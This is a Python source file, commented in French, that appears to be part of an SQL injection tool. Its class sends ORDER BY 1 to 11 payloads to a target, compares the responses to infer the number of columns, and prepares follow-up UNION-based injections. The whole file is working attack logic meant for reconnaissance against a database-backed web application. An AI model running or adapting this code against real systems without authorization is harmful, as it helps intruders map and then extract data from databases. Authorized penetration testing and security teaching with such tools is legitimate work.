#!/usr/bin/python3

class Error:
	class ErrorException(Exception):
		pass

	def __init__(self, tester):
        # Initialisation avec les attributs de Tester
		self.submit = tester.submit
		self.delimiter = tester.delimiter
		self.comment = tester.payload
		self.original_text = tester.original_text
		self.normal_text = tester.normal_text

	def error(self):
		from program import final_archive
		from utils import get_diff
		"""But: découvrir combien de colonnes sont dans la base cible
			pour préparer des injections UNION plus poussées

		- Les tables de base de données ont rarement plus de 12 colonnes
		Cela permet de couvrir une large gamme de scénarios possibles tout en maintenant les performances raisonnables"""
		flag = False
		final_archive.log("Starting column count detection", section="INFO")
		for i in range(1, 12):
			from utils import Colors, get_diff
			q = f" ORDER BY {i}"
			query = self.delimiter + q + self.comment
			res = self.submit(query)
			#Enregistre la requête SQL qui est en train d'être exécutée
			final_archive.log(f"Executed QUERY: {query}", Colors.PURPLE, section="COLUMN DETECTION")
			"""Comparer la réponse actuelle "res.text"
			Avec le texte de réponse original, obtenu sans injection SQL -original_text-"""
			result = get_diff(self.original_text, res.text)
			"""Vérifie si result est vide (c.a.d si aucune différence n'est trouvée)
			vérifie si la réponse actuelle est exactement la même que la réponse sans injection"""
			#permet de s'assurer que l'ajout de ORDER BY n'a pas eu d'impact visible
			if res.text and not result:
				flag = 1
				continue
			"""Comparer la réponse actuelle "res.text"
			avec le texte obtenu lors d'une injection SQL simple -self.normal_text-"""
			result = get_diff(self.normal_text, res.text)
			"""Si les longueurs sont égales, 
			indique que la réponse n'a pas été modifiée par l'injection
			vérifie si la réponse actuelle est similaire en longueur à la réponse avec une injection triviale"""
			#vérifie la validité de la réponse dans le contexte d'une injection SQL
			if len(self.normal_text) == len(res.text):
				flag = 1
				continue
			#Si result est vide (c.a.d aucune différence trouvée)
			#il n'est pas mis à 1 car cela ne donne pas d'information sur la validité de l'injection
			if not result:
				continue
			break
		"""column_counts est 0, ce qui signifie qu'aucune colonne valide n'a été trouvée
		>= 10, cela pourrait indiquer une situation atypique où soit la table a un nombre inhabituellement élevé de colonnes"""
		column_counts = i - flag
		if column_counts == 0 or column_counts >= 10:
			final_archive.log(f"UNION Column method does not work for this \"{self.comment}\" comment provided.", section="ERROR")
			raise self.ErrorException(f"UNION Column method does not work for this \"{self.comment}\" comment.\n")
		final_archive.log(f"column counts: {column_counts}")
		return column_counts